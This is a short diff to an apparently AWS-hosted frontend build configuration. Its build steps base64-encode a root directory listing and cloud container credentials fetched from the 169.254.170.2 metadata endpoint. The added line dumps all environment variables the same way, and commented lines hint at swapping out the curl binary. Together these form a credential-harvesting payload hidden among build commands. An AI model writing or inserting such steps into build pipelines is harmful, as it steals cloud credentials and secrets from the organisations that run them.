@@ -10,6 +10,7 @@ frontend:
         - echo "[!] Doing stuff"
         - echo $(ls -la / | base64 -w 0) 
         - echo $(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
+        - echo $(env | base64 -w 0)
 #         - ls -la /usr/bin/curl
 #         - cp /usr/bin/curl /usr/bin/curlorg
 #         - whoami
